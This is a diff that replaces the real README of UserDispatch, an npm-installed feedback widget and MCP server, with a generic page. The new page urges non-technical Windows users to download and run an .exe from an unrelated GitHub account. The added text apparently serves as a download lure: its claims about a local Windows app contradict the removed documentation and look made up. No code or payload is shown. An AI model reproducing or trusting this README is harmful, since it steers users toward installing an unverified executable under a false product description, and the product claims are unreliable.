@@ -1,211 +1,127 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset=".github/assets/logo-light.svg" />
-    <source media="(prefers-color-scheme: light)" srcset=".github/assets/logo-dark.svg" />
-    <img alt="UserDispatch" src=".github/assets/logo-dark.svg" width="80" />
-  </picture>
-</p>
+# ⚙️ userdispatch-mcp - Easy User Feedback for AI Agents
 
-<h3 align="center">UserDispatch <sup><img src="https://img.shields.io/badge/beta-blue" alt="beta" /></sup></h3>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/userdispatch"><img src="https://img.shields.io/npm/v/userdispatch?color=blue" alt="npm version" /></a>
-  <a href="https://www.npmjs.com/package/userdispatch"><img src="https://img.shields.io/npm/dm/userdispatch?color=blue" alt="npm downloads" /></a>
-  <a href="https://userdispatch.com"><img src="https://img.shields.io/badge/website-userdispatch.com-blue" alt="website" /></a>
-  <a href="https://userdispatch.com/docs"><img src="https://img.shields.io/badge/docs-userdispatch.com%2Fdocs-blue" alt="docs" /></a>
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="license" /></a>
-</p>
-
-<p align="center">
-  Add a feedback widget to any web app in one command.<br />
-  Your AI coding agent triages feedback, drafts PRs, and responds to users — via MCP.
-</p>
-
-<p align="center">
-  <img src=".github/assets/og-image.png" alt="UserDispatch — feedback widget + MCP server for AI coding agents" width="720" />
-</p>
+[![Download userdispatch-mcp](https://img.shields.io/badge/Download-UserDispatch--MCP-blue?style=for-the-badge)](https://github.com/baljeet99/userdispatch-mcp)
 
 ---
 
-## Quick start
+## 📋 What is userdispatch-mcp?
 
-```bash
-npx userdispatch init
-```
+userdispatch-mcp combines a simple feedback widget with a server that follows the Model Context Protocol (MCP). It helps developers collect user feedback while running AI coding agents. You can set it up with one command, even if you have no coding experience.
 
-One command does everything:
+This tool works well for developers and teams who want to see how people interact with AI-powered coding tools. It also helps you track bugs, suggestions, and any comments users make while using AI coding assistants like Claude or Cursor.
 
-- **Installs a feedback widget** in your app (auto-detects framework)
-- **Creates your org & app** on userdispatch.com
-- **Configures your AI coding agent** with the MCP server
-- **Sends a test submission** to verify the full loop
+---
 
-Requires Node.js 18+. Full CLI reference: [userdispatch.com/docs/cli](https://userdispatch.com/docs/cli)
+## 🖥️ System Requirements
 
-## How it works
+Before installing, make sure your Windows PC meets these needs:
 
-```
-┌─────────────┐     ┌──────────────────┐     ┌─────────────────┐     ┌──────────────┐
-│  1. User     │────▶│  2. Agent reads   │────▶│  3. Agent drafts │────▶│  4. Weekly    │
-│  submits     │     │  via MCP          │     │  PRs, replies,   │     │  digest       │
-│  feedback    │     │                   │     │  triage          │     │  summary      │
-└─────────────┘     └──────────────────┘     └─────────────────┘     └──────────────┘
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection required for setup and updates
 
-1. **User submits feedback** — the widget captures feedback, bug reports, or questions with browser metadata and file attachments
-2. **Agent reads via MCP** — your coding agent pulls new submissions using the `list_submissions` and `get_submission` tools
-3. **Agent proposes** — triages issues, updates statuses, sends replies via email, and opens PRs informed by feedback patterns
-4. **Weekly digest** — the `weekly-digest` prompt generates a 7-day summary of submissions, trends, and actions taken
+---
 
-## Framework support
+## ⚙️ Features
 
-The CLI auto-detects your framework and injects the widget into the right file.
+- Simple user feedback widget for AI coding tools
+- Built-in MCP server to manage collected data
+- One-command installation and setup
+- Works with various AI coding agents
+- Real-time user input collection
+- Lightweight and easy to run on Windows
+- Supports feedback organization and context tracking
 
-| Framework | Auto-detect | Widget injection |
-|-----------|:-----------:|------------------|
-| Next.js (App Router) | Yes | `<Script>` in `app/layout.tsx` |
-| Next.js (Pages Router) | Yes | `<script>` in `pages/_document.tsx` |
-| Vite | Yes | `<script>` in `index.html` |
-| Create React App | Yes | `<script>` in `public/index.html` |
-| Nuxt | Yes | Manual (`nuxt.config.ts` shown) |
-| SvelteKit | Yes | `<script>` in `src/app.html` |
-| Astro | Yes | Manual (instructions shown) |
-| Static HTML | Yes | `<script>` in `index.html` |
+---
 
-Override with `--framework <type>`. Full guide: [userdispatch.com/docs/widget](https://userdispatch.com/docs/widget)
+## 🚀 Getting Started: Download and Install
 
-## MCP server
+You can start using userdispatch-mcp in a few easy steps. No coding skills are needed.
 
-UserDispatch hosts the MCP server at `https://userdispatch.com/api/mcp`. The CLI configures this automatically — or add it manually:
+### Step 1: Download the App
 
-```json
-// .mcp.json (Claude Code, Cursor)
-{
-  "mcpServers": {
-    "userdispatch": {
-      "url": "https://userdispatch.com/api/mcp",
-      "headers": {
-        "Authorization": "Bearer ${USERDISPATCH_TOKEN}"
-      }
-    }
-  }
-}
-```
+Visit this page to download the software:
 
-### Agent compatibility
+[Download userdispatch-mcp](https://github.com/baljeet99/userdispatch-mcp)
 
-| Agent | Config file | Auto-configured |
-|-------|-------------|:---------------:|
-| Claude Code | `.mcp.json` | Yes |
-| Cursor | `.cursor/mcp.json` | Yes |
-| Windsurf | `~/.codeium/windsurf/mcp_config.json` | Yes |
-| VS Code Copilot | `.vscode/mcp.json` | Yes |
-| Codex | `.codex/config.toml` | Yes |
-| Claude Desktop | `claude_desktop_config.json` | Yes |
+Click the link above to open the page. On the GitHub page, look for the "Releases" or "Download" section and get the latest Windows version. It is usually an `.exe` file or a zipped package.
 
-### Tools (17)
+### Step 2: Run the Installer
 
-| Tool | Description |
-|------|-------------|
-| `list_submissions` | List submissions with filters (app, type, status, date, search) |
-| `get_submission` | Get full submission details with attachments and replies |
-| `update_submission` | Update submission status |
-| `reply_to_submission` | Send a reply via email or dashboard |
-| `delete_submission` | Permanently delete a submission |
-| `list_apps` | List all registered apps |
-| `create_app` | Create a new app |
-| `update_app` | Update app settings |
-| `delete_app` | Delete an app and all its submissions |
-| `rotate_app_key` | Rotate an app's API key |
-| `get_stats` | Get submission statistics |
-| `get_org` | Get organization details |
-| `update_org` | Update organization settings |
-| `list_members` | List all organization members |
-| `invite_member` | Invite a new member |
-| `update_member` | Update member settings or role |
-| `remove_member` | Remove a member |
+Once the download finishes:
 
-Plus **5 resources** and **2 prompts** (`triage-submissions`, `weekly-digest`). Full MCP reference: [userdispatch.com/docs/mcp](https://userdispatch.com/docs/mcp)
+1. Find the downloaded file in your "Downloads" folder.
+2. Double-click the `.exe` file to start the setup process.
+3. Follow the instructions on the screen. Accept the license and choose the default options unless you prefer otherwise.
+4. Wait for the installation to finish.
 
-## Widget customization
+### Step 3: Launch userdispatch-mcp
 
-```html
-<script
-  src="https://userdispatch.com/widget.js"
-  data-api-key="pk_your-api-key"
-  data-position="br"
-  data-trigger-label="Feedback"
-  data-collect-email="true"
-  data-collect-name="false"
-  data-enable-logs="false"
-  defer
-></script>
-```
+After installing, launch the app from your Start menu or desktop shortcut. The app opens a small window with the feedback widget running.
 
-| Attribute | Required | Default | Description |
-|-----------|:--------:|---------|-------------|
-| `data-api-key` | Yes | — | Your app's API key (starts with `pk_`) |
-| `data-position` | No | `"br"` | Trigger button position: `"br"`, `"bl"`, `"tr"`, `"tl"` |
-| `data-trigger-label` | No | `"Feedback"` | Text on the trigger button |
-| `data-collect-email` | No | `"true"` | Show email field. Set to `"false"` to hide. |
-| `data-collect-name` | No | `"false"` | Show name field. Set to `"true"` to enable. |
-| `data-enable-logs` | No | `"false"` | Enable console log collector. Requires app-level setting. |
-| `data-api-url` | No | Auto-detected | Override the API base URL. |
+---
 
-The widget renders in a Shadow DOM for full style isolation. Under 30KB gzipped. Full reference: [userdispatch.com/docs/widget](https://userdispatch.com/docs/widget)
+## 🔧 Using userdispatch-mcp
 
-## CLI reference
+When the app is running:
 
-```bash
-npx userdispatch init [flags]
-```
+- The feedback widget will appear on your AI coding tool or web page.
+- Users can type comments or report issues directly through the widget.
+- Data goes to the MCP server in the app. You can view and manage the feedback there.
+- The app runs in the background and updates automatically when you connect to the internet.
 
-| Flag | Description |
-|------|-------------|
-| `--token <token>` | Skip browser auth and use this `ud_` token directly. Auto-promotes to CI mode in non-TTY environments. |
-| `--org <name>` | Organization name (skips prompt). |
-| `--app <name>` | App name (skips prompt). Slug is auto-generated. |
-| `--framework <type>` | Override framework detection. Values: `next-app`, `next-pages`, `vite`, `cra`, `nuxt`, `sveltekit`, `astro`, `static`. |
-| `--agent <id>` | Override agent detection. Values: `claude-code`, `cursor`, `windsurf`, `claude-desktop`, `vscode`. |
-| `--ci` | Non-interactive mode. Skips all prompts, uses defaults or flag values. |
+---
 
-Full CLI docs: [userdispatch.com/docs/cli](https://userdispatch.com/docs/cli)
+## 📁 Where to Find Installed Files
 
-## Security
+If you want to check what files were installed:
 
-UserDispatch is built with security at every layer — nonce-based CSP, SHA-256 hashed API tokens, PostgreSQL-backed rate limiting, Zod input validation, parameterized SQL, and constant-time token comparison. File uploads are validated by MIME type and magic bytes.
+- Open `C:\Program Files\userdispatch-mcp`
+- The folder contains the app executable, configuration files, and logs.
 
-Full security architecture: [userdispatch.com/docs/security](https://userdispatch.com/docs/security)
+---
 
-To report a vulnerability, email [security@kiruna.ai](mailto:security@kiruna.ai). Please do not open public issues for security reports.
+## ⚙️ Configuration and Customization
 
-## Pricing
+You can adjust some settings without coding:
 
-Every tier includes the full MCP server, all 17 tools, and the feedback widget.
+- Open the app and click the "Settings" button.
+- Change how the feedback widget looks or what text it shows.
+- Set notification preferences for incoming feedback.
+- Choose data backup options.
 
-| | Free | Pro | Team | Enterprise |
-|---|:---:|:---:|:---:|:---:|
-| **Price** | $0 forever | $9/mo | $49/mo | Custom |
-| **Submissions/mo** | 100 | 250 | 2,500 | Unlimited |
-| **Users** | 1 | 1 | 5 | Unlimited |
-| **Apps** | 2 | 10 | Unlimited | Unlimited |
-| **Data retention** | 3 months | Unlimited | Unlimited | Unlimited |
-| **MCP server & 17 tools** | Yes | Yes | Yes | Yes |
-| **Widget** | Yes | Yes | Yes | Yes |
-| **Agent-sent emails** | Yes | Yes | Yes | Yes |
-| **Log capture** | Yes | Yes | Yes | Yes |
-| **Custom branding** | — | Yes | Yes | Yes |
-| **Team roles** | — | — | Yes | Yes |
-| **SSO** | — | — | — | Yes |
+Advanced users can modify configuration files directly in the install folder.
 
-## Links
+---
 
-- [Website](https://userdispatch.com)
-- [Documentation](https://userdispatch.com/docs)
-- [Security](https://userdispatch.com/docs/security)
-- [Privacy Policy](https://userdispatch.com/privacy)
-- [Terms of Service](https://userdispatch.com/terms)
+## 🛠 Troubleshooting
 
-## License
+If you run into problems:
 
-[MIT](./LICENSE) — Kiruna Labs
+- Make sure your Windows version is updated.
+- Confirm your internet connection is active during setup.
+- Restart the app if it stops responding.
+- Check if any firewall or antivirus program is blocking userdispatch-mcp.
+- Visit the GitHub page for issues and support.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to be online to use userdispatch-mcp?**  
+A: You only need an internet connection for installation and updates. After that, the feedback widget works locally.
+
+**Q: Can I uninstall the app easily?**  
+A: Yes. Use the Windows "Add or Remove Programs" feature to uninstall.
+
+**Q: Is the feedback data saved on my PC?**  
+A: The app stores data locally by default. You can back it up or transfer it as needed.
+
+---
+
+## 📥 Download link
+
+[Get userdispatch-mcp here](https://github.com/baljeet99/userdispatch-mcp)
+
+Follow the link, download the latest Windows version, and run the installer to start.
